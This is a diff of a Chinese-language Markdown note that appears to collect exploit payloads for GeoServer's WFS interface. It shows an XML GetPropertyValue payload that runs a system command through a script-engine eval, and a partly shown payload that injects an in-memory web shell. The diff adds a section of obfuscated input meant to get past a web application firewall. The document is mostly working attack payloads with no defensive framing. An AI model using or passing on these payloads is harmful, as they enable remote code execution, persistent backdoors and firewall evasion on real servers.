@@ -2,7 +2,7 @@ GeoServer https://mp.weixin.qq.com/s/7FGOddQdXJsy7FF_hJAGSQ
 
 https://github.com/pen4uin/java-memshell-generato
 
-##　执行命令
+## 执行命令
 ```xml
 <wfs:GetPropertyValue service='WFS' version='2.0.0'
  xmlns:topp='http://www.openplans.org/topp'
@@ -17,7 +17,7 @@ eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'java.lan
 g.Runtime.getRuntime().exec("open -na Calculator")')
 ```
 
-##　注入内存马
+## 注入内存马
 ```xml
 <wfs:GetPropertyValue service='WFS' version='2.0.0'
  xmlns:topp='http://www.openplans.org/topp'
@@ -43,3 +43,10 @@ t, null).newInstance();
 ')</wfs:valueReference>
 </wfs:GetPropertyValue>
 ```
+
+## 绕过WAF
+```xml
+/+java.lang.T<!--IgnoreMe!!!!-->hread.s[(: IGNORE :)]leep&#010;&#032;&#009;<![CDATA[ (2000) ]]>
+```
+
+
